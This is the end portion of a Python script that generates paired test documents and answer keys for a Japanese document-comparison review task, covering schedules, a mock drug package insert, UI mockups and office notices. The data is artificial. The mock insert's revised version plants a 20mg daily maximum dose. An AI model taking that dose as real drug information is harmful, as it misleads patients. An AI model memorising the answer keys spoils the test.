    sch2 = [list(x) for x in sch]; sch2[3][2] = '2026/12/16'; sch2[4][1] = '2026/12/12'; sch2[4][2] = '2026/12/18'; sch2.append(['コンクリート打設', '2026/12/19', '2026/12/19', '生コン 大成'])
    mkxlsx(f'{d}/工程表_12月_第1版.xlsx', {'工程': sch}); mkxlsx(f'{d}/工程表_12月_第2版.xlsx', {'工程': sch2})
    key(d, '施工図（A1相当の大きな画像、現場スキャンは-0.7°傾き）：ピット 1800×1500→2000×1500、ピットの枠が広がる、注記追加', '工程表：配筋終了・型枠の開始終了の変更、打設の追加')


def r18(d):
    a = [['## 【効能又は効果】', '高血圧症'], ['## 【用法及び用量】', '通常、成人には1日1回5mgを経口投与する。', 'なお、年齢、症状により適宜増減するが、1日最大10mgまでとする。'],
         ['## 【重要な基本的注意】', 'めまい等があらわれることがあるので、高所作業、自動車の運転等に注意させること。'], ['## 【副作用】', '頻度不明：頭痛、ほてり、浮腫']]
    b = [a[0], ['## 【用法及び用量】', '通常、成人には1日1回5mgを経口投与する。', 'なお、年齢、症状により適宜増減するが、1日最大20mgまでとする。'],
         ['## 【重要な基本的注意】', 'めまい等があらわれることがあるので、高所作業、自動車の運転等危険を伴う機械を操作する際には注意させること。'], ['## 【副作用】', '0.1〜1%未満：頭痛、ほてり', '頻度不明：浮腫、歯肉肥厚']]
    chrome_pdf(f'{d}/添付文書_第5版.pdf', pages_html('アムロ錠5mg 添付文書', a)); chrome_pdf(f'{d}/添付文書_第6版.pdf', pages_html('アムロ錠5mg 添付文書', b))
    mkdocx(f'{d}/改訂のお知らせ_第6版.docx', '使用上の注意改訂のお知らせ', ['用法及び用量：1日最大10mg→20mg', '重要な基本的注意：機械操作の注意を追記', '副作用：頻度の区分を変更'])
    key(d, '用法及び用量 1日最大10mg→20mg（1文字）', '重要な基本的注意に追記', '副作用の頻度区分を変更、歯肉肥厚の追加', '改訂のお知らせWordと突き合わせられるか')


def r19(d):
    def ui(path, btn, color, extra=False):
        im = Image.new('RGB', (1280, 800), '#f4f6f8'); d2 = ImageDraw.Draw(im)
        d2.rectangle([0, 0, 1280, 64], fill='#1d2733'); d2.text((24, 16), 'ShibaHub 管理画面', fill='white', font=font(26, True))
        d2.rectangle([40, 110, 600, 420], fill='white', outline='#ccd'); d2.text((60, 130), 'ユーザー登録', fill='#222', font=font(28, True))
        for i, lab in enumerate(['氏名', 'メールアドレス', '部署']):
            d2.text((60, 190 + i * 64), lab, fill='#444', font=font(20)); d2.rectangle([200, 184 + i * 64, 560, 220 + i * 64], outline='#99a')
        d2.rounded_rectangle([60, 370, 260, 410], 8, fill=color); d2.text((90, 376), btn, fill='white', font=font(22, True))
        if extra: d2.text((60, 440), '※ 必須項目です', fill='#b42318', font=font(18))
        im.save(P(path))
    ui(f'{d}/登録画面_v1.png', '登録する', '#7fb3e8'); ui(f'{d}/登録画面_v2.png', '登録する', '#1a5fb4', extra=True)
    key(d, 'ボタンの色（コントラスト不足の水色→濃い青）、「※ 必須項目です」の追加', 'アイコン・キーボード操作・狭い画面（760px未満）・色覚、全ページ表示や出力設定ダイアログの操作性')


def r20(d):
    a = ['社員各位', '年末の大掃除について', '日時 12月26日（金）14時から', '場所 各部署', '持ち物 軍手、ぞうきん', '以上']
    b = ['社員各位', '年末の大掃除について', '日時 12月25日（木）15時から', '場所 各部署と共用部（会議室・給湯室）', '持ち物 軍手、ぞうきん、マスク', '以上']
    mkdocx(f'{d}/お知らせ_大掃除.docx', 'お知らせ', a); mkdocx(f'{d}/お知らせ_大掃除_修正.docx', 'お知らせ', b)
    app = lambda dt: html_doc(f'<h1>備品購入申請書</h1><table><tr><th>申請日</th><td>{dt}</td></tr><tr><th>品名</th><td>シュレッダー</td></tr><tr><th>数量</th><td>1</td></tr><tr><th>金額</th><td>32,800円</td></tr></table><p>上長印：</p>')
    chrome_pdf(f'{d}/備品購入申請書_提出.pdf', app('2026年11月20日')); chrome_pdf(f'{d}/備品購入申請書_再提出.pdf', app('2026年11月27日'))
    key(d, 'お知らせ：日時（25日木曜15時）、場所に共用部、持ち物にマスク', '申請書：申請日 11月20日→11月27日', '説明なしで、注釈（付箋）を付けてレポートを出せるか')


SPEC = [
    (1, '契約審査担当', '法務部', r01), (2, '規程管理担当', '総務部', r02), (3, '経理主任', '経理部', r03), (4, '調達担当', '購買部', r04), (5, '品質保証課長', '品質保証部', r05),
    (6, '機械設計エンジニア', '設計部', r06), (7, 'ソフトウェアエンジニア', '開発部', r07), (8, '社内SE（インフラ）', '情報システム部', r08), (9, 'テストエンジニア', '品質管理部', r09),
    (10, '営業課長', '営業部', r10), (11, '人事労務担当', '人事部', r11), (12, '経営企画部長', '経営企画部', r12), (13, 'テクニカルライター', 'ドキュメント課', r13),
    (14, '情報セキュリティ担当', 'セキュリティ推進室', r14), (15, '文書管理担当（自治体）', '市役所総務課', r15), (16, '研究員', '研究開発センター', r16), (17, '施工管理者', '建設部工事課', r17),
    (18, '薬事担当', '薬事・品質部', r18), (19, 'UIUXデザイナー（アクセシビリティ）', 'デザイン部', r19), (20, '一般事務（新入社員）', '営業事務課', r20)]


def main():
    if os.path.exists(ROOT): shutil.rmtree(ROOT)
    G.CHROME_PDFS.clear()
    for no, role, dept, gen in SPEC:
        d = f'R{no:02d}_{dept}_{role}'
        gen(d)
    async def mk():
        from playwright.async_api import async_playwright
        async with async_playwright() as p:
            b = await p.chromium.launch(executable_path='/usr/bin/google-chrome'); pg = await b.new_page()
            for path, html in G.CHROME_PDFS: await pg.set_content(html); await pg.pdf(path=path, format='A4')
            await b.close()
    asyncio.run(mk())
    for d, lines in KEYS.items():
        open(P(f'{d}/正解.md'), 'w', encoding='utf-8').write('# 用意した変更点（レビュアーは見ないで確認してから照合）\n\n' + ''.join(f'- {x}\n' for x in lines))
    print('ok', len(SPEC), ROOT)


if __name__ == '__main__':
    main()
